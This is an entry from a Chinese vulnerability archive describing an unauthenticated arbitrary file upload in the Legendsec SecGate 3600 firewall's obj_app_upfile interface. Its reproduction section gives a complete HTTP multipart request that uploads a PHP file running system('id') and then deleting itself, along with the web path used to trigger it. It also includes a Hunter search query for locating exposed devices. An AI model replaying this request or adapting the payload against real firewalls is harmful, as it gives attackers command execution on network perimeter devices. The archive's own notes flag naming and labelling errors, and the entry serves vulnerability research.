---
source: "wy876 漏洞文库"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "网神SecGata3600防火墙obj_app_upfile任意文件上传漏洞"
product: "网神SecGate3600 obj_app_upfile"
record_type: "unknown"
document_type: "技术文章（细分类待核）"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "含__hash__固定值需解释是否认证/CSRF必要；缺版本修复，各submit_post动作需独立核根因"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/%E7%BD%91%E7%A5%9ESecGata3600%E9%98%B2%E7%81%AB%E5%A2%99obj_app_upfile%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
fofa_unverified: "app.name="
hunter: "app.name=\"网神 SecGate\"&&web.title==\"网神SecGate 3600防火墙\""
source_url: "https://www.yuque.com/xiaokp7/ocvun2/yrkaybyh5yggyktv"
id: "vw-64ce0b8e3091ed3b852d4707"
entity_id: "ve-64ce0b8e3091ed3b852d4707"
schema_version: "1"
---

# 网神SecGata3600防火墙obj_app_upfile任意文件上传漏洞

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：网神SecGate3600 obj_app_upfile
- 文献类型：技术文章（细分类待核）
- 版本、权限及部署边界：含__hash__固定值需解释是否认证/CSRF必要；缺版本修复，各submit_post动作需独立核根因
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. SecGata拼错/Hunter误FOFA且截断
2. HTTP误标java
3. 含__hash__固定值需解释是否认证/CSRF必要
4. 路径嵌font标签到行内代码造成污染
5. PHP执行并自删未给输出和后续清理确认
6. 缺版本修复，各submit_post动作需独立核根因

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://www.yuque.com/xiaokp7/ocvun2/yrkaybyh5yggyktv>

### 归档技术正文

# 一、漏洞简介
<font style="color:rgb(0, 0, 0);">网神 SecGate 3600 防火墙 obj_app_upfile接口存在任意文件上传漏洞，攻击者通过构造特殊请求包即可获取服务器权限。</font>

# <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ 网神SecGata 3600防火墙

# 三、资产测绘
+ hunter:`app.name="网神 SecGate"&&web.title=="网神SecGate 3600防火墙"`


+ 登录页面


# 四、漏洞复现
<font style="color:rgb(0, 0, 0);">没有对文件调用进行鉴权，且文件上传路径为可访问路径，造成任意文件上传</font>

```java
POST /?g=obj_app_upfile HTTP/1.1
Host: xx.xx.xx.xx
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 569
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="MAX_FILE_SIZE"

10000000
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="upfile"; filename="test.php"
Content-Type: text/plain

<?php system("id");unlink(__FILE__);?>

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="submit_post"

obj_app_upfile
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="__hash__"

0b9d6b1ab7479ab69d9f71b05e0e9445
------WebKitFormBoundaryJpMyThWnAxbcBBQc--
```


<font style="color:rgb(0, 0, 0);">默认上传路径 </font>`<font style="color:rgb(0, 0, 0);">/secgate/webui/attachements/</font>`<font style="color:rgb(0, 0, 0);"> ， 访问 </font>`<font style="color:rgb(0, 0, 0);">attachements/test.php</font>`<font style="color:rgb(0, 0, 0);"> 文件</font>


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yrkaybyh5yggyktv>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
